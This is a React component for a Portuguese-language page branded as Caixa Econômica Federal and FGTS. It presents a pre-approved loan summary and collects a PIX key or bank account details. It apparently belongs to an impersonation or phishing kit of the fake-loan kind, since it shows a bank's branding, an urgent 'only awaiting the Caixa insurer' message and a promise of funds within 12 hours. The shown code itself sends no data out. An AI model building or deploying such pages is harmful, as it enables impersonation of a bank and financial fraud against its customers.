
import React, { useState } from 'react';
import { useLocation, useNavigate } from 'react-router-dom';
import { ArrowRight, CreditCard, BanknoteIcon, User, Check } from 'lucide-react';
import CaixaLogo from '@/components/CaixaLogo';
import FGTSLogo from '@/components/FGTSLogo';
import { Button } from '@/components/ui/button';
import { useIsMobile } from '@/hooks/use-mobile';
import { RadioGroup, RadioGroupItem } from '@/components/ui/radio-group';
import { Label } from '@/components/ui/label';
import { Input } from '@/components/ui/input';

const BankDetails = () => {
  const navigate = useNavigate();
  const location = useLocation();
  const isMobile = useIsMobile();
  const [paymentMethod, setPaymentMethod] = useState('pix');
  const [pixKey, setPixKey] = useState('');
  const [bankName, setBankName] = useState('');
  const [accountNumber, setAccountNumber] = useState('');
  const [branch, setBranch] = useState('');
  
  // Get data from location state
  const { 
    bankLogo, 
    totalAmount, 
    installmentsCount, 
    installmentValue,
    interestRate,
    userName,
    userCPF
  } = location.state || {
    bankLogo: "https://upload.wikimedia.org/wikipedia/commons/thumb/8/8d/Caixa_Econ%C3%B4mica_Federal_logo.svg/2560px-Caixa_Econ%C3%B4mica_Federal_logo.svg.png",
    totalAmount: 10000,
    installmentsCount: 60,
    installmentValue: 250,
    interestRate: 0.018,
    userName: "JUAREZ JOSE FERNANDES DE FREITAS",
    userCPF: "123.456.789-00"
  };
  
  const formatCurrency = (value: number): string => {
    return new Intl.NumberFormat('pt-BR', {
      style: 'currency',
      currency: 'BRL',
      minimumFractionDigits: 2,
      maximumFractionDigits: 2
    }).format(value);
  };
  
  const handleSubmit = () => {
    navigate('/loan-confirmation');
  };

  return (
    <div className="min-h-screen flex flex-col bg-gradient-to-r from-[#008792] to-[#005CA9]">
      {/* Header */}
      <div className="p-4 sm:p-6 flex justify-between items-center">
        <FGTSLogo className={`${isMobile ? 'h-8 w-24' : 'h-10'}`} />
        <CaixaLogo className={`${isMobile ? 'h-8 w-24' : 'h-10'}`} />
      </div>

      {/* Title */}
      <div className="p-4 sm:p-6">
        <div className="text-white text-2xl font-light">Informações Bancárias</div>
        <div className="text-white opacity-60 text-sm mt-1">
          Informe os dados para recebimento do valor
        </div>
      </div>

      {/* Main content */}
      <div className="mt-4 flex-1 bg-white rounded-t-3xl overflow-hidden">
        <div className="p-4 sm:p-6">
          {/* User info section */}
          <div className="mb-6">
            <div className="flex items-center gap-2 mb-1">
              <User size={18} className="text-gray-600" />
              <h3 className="font-semibold">{userName}</h3>
            </div>
            <div className="flex items-center gap-2 mb-4">
              <span className="text-sm text-gray-600">CPF: {userCPF}</span>
            </div>
          </div>
          
          {/* Loan details summary */}
          <div className="bg-blue-50 p-4 rounded-lg mb-6">
            <h3 className="font-semibold text-[#005CA9] mb-2">DADOS DO EMPRÉSTIMO</h3>
            <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
              <div>
                <div className="text-sm text-gray-500">Valor do empréstimo</div>
                <div className="font-medium">{formatCurrency(totalAmount)}</div>
              </div>
              <div>
                <div className="text-sm text-gray-500">Parcelas</div>
                <div className="font-medium">{installmentsCount}x de {formatCurrency(installmentValue)}</div>
              </div>
              <div>
                <div className="text-sm text-gray-500">Taxa de juros</div>
                <div className="font-medium">{(interestRate * 100).toFixed(1)}% ao mês</div>
              </div>
              <div>
                <div className="text-sm text-gray-500">Valor total a pagar</div>
                <div className="font-medium">{formatCurrency(installmentValue * installmentsCount)}</div>
              </div>
            </div>
          </div>
          
          {/* Payment method selection */}
          <div className="mb-6">
            <h3 className="font-semibold text-gray-800 mb-3">CONTA PARA RECEBIMENTO</h3>
            
            <RadioGroup value={paymentMethod} onValueChange={setPaymentMethod} className="space-y-3">
              <div className="flex items-start space-x-2">
                <RadioGroupItem value="pix" id="pix" className="mt-1" />
                <div className="grid gap-1.5">
                  <Label htmlFor="pix" className="font-medium">PIX</Label>
                  <p className="text-sm text-gray-500">Receba o valor diretamente em sua chave PIX</p>
                </div>
              </div>
              <div className="flex items-start space-x-2">
                <RadioGroupItem value="bank" id="bank" className="mt-1" />
                <div className="grid gap-1.5">
                  <Label htmlFor="bank" className="font-medium">Conta Corrente</Label>
                  <p className="text-sm text-gray-500">Informe os dados da sua conta bancária</p>
                </div>
              </div>
            </RadioGroup>
          </div>
          
          {/* Payment details based on selection */}
          {paymentMethod === 'pix' ? (
            <div className="mb-6">
              <Label htmlFor="pixKey" className="block mb-2 font-medium">
                DIGITE ABAIXO A CHAVE PIX QUE DESEJA RECEBER O EMPRÉSTIMO
              </Label>
              <Input
                id="pixKey"
                placeholder="CPF, Email, Celular ou Chave Aleatória"
                value={pixKey}
                onChange={(e) => setPixKey(e.target.value)}
                className="mb-2"
              />
              <div className="flex items-center gap-2 mt-2 text-sm text-gray-500">
                <BanknoteIcon size={16} />
                <span>Enviaremos o valor para a chave informada</span>
              </div>
            </div>
          ) : (
            <div className="mb-6 space-y-4">
              <div>
                <Label htmlFor="bankName" className="block mb-2">
                  Nome do Banco
                </Label>
                <Input
                  id="bankName"
                  placeholder="Informe o nome do banco"
                  value={bankName}
                  onChange={(e) => setBankName(e.target.value)}
                />
              </div>
              <div>
                <Label htmlFor="branch" className="block mb-2">
                  Agência
                </Label>
                <Input
                  id="branch"
                  placeholder="Informe a agência"
                  value={branch}
                  onChange={(e) => setBranch(e.target.value)}
                />
              </div>
              <div>
                <Label htmlFor="accountNumber" className="block mb-2">
                  Número da Conta
                </Label>
                <Input
                  id="accountNumber"
                  placeholder="Informe o número da conta"
                  value={accountNumber}
                  onChange={(e) => setAccountNumber(e.target.value)}
                />
              </div>
            </div>
          )}
          
          {/* Additional information */}
          <div className="mb-6">
            <div className="bg-yellow-50 p-3 rounded-md mb-4 text-yellow-800 text-sm">
              <div className="font-semibold mb-1">VALOR CAI EM ATÉ 12 HORAS</div>
              <p>Após a confirmação, o valor será depositado na conta informada.</p>
            </div>
            
            <div className="bg-green-50 p-3 rounded-md text-green-800 text-sm">
              <p className="font-medium">SEU EMPRÉSTIMO ESTÁ SENDO FINALIZADO, ESTAMOS APENAS AGUARDANDO A CONFIRMAÇÃO DA SEGURADORA CAIXA.</p>
            </div>
          </div>
          
          {/* Submit button */}
          <Button 
            className="w-full bg-[#005CA9] hover:bg-[#004A87] text-white px-6 py-6 rounded-full"
            onClick={handleSubmit}
            disabled={paymentMethod === 'pix' ? !pixKey : (!bankName || !accountNumber || !branch)}
          >
            <CreditCard className="w-5 h-5 mr-2" />
            CONFIRMAR DADOS BANCÁRIOS
            <ArrowRight className="w-5 h-5 ml-2" />
          </Button>
        </div>
      </div>
    </div>
  );
};

export default BankDetails;
